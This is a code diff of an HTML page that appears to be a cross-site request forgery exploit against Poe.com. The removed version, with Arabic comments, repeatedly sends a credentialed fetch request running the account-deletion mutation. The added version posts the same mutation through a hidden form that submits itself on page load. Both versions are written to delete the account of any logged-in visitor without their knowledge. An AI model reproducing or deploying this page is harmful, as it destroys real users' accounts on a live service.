@@ -1,49 +1,13 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <title>PoE CSRF Exploit Test</title>
-</head>
+<html>
 <body>
-  <h2>CSRF Exploit Test for PoE.com</h2>
-  <p>إذا أنت مسجل دخول في Poe.com، فتح هذا الصفحة سيحاول حذف حسابك تلقائياً.</p>
-
+  <form action="https://poe.com/api/gql_POST" method="POST" id="csrfForm">
+    <input type="hidden" name="queryName" value="SettingsDeleteAccountButton_deleteAccountMutation_Mutation" />
+    <input type="hidden" name="variables" value="{}" />
+    <input type="hidden" name="extensions" value='{"hash":"3b63c061d6595db745a8ec20c3bbf0088e1833602db454b795ff6e6bb806f427"}' />
+  </form>
   <script>
-  function sendDeleteRequest() {
-    fetch("https://poe.com/api/gql_POST", {
-      method: "POST",
-      credentials: "include",
-      headers: {
-        "Content-Type": "application/json",
-        "Poe-Tchannel": "poe-chan119-8888-yxrunnyzubsxrigdybaz",
-        "Poe-Revision": "f85311637a5b941da700e7e6c6eece424dce6efa",
-        "Poegraphql": "1",
-        "Poe-Queryname": "SettingsDeleteAccountButton_deleteAccountMutation_Mutation",
-        "Poe-Tag-Id": "80081b97e0641a3798d3972660600406"
-      },
-      body: JSON.stringify({
-        queryName: "SettingsDeleteAccountButton_deleteAccountMutation_Mutation",
-        variables: {},
-        extensions: { hash: "3b63c061d6595db745a8ec20c3bbf0088e1833602db454b795ff6e6bb806f427" }
-      })
-    })
-    .then(res => res.json())
-    .then(data => {
-      console.log("Response:", data);
-      alert("تم إرسال الطلب. تحقق من حسابك!");
-    })
-    .catch(err => {
-      console.error("خطأ في الإرسال:", err);
-      alert("فشل في إرسال الطلب");
-    });
-  }
-
-  // أرسل أول طلب فوراً
-  sendDeleteRequest();
-
-  // ثم كرر كل 5 ثواني
-  setInterval(sendDeleteRequest, 5000);
-</script>
-
+    document.getElementById('csrfForm').submit();
+  </script>
 </body>
 </html>
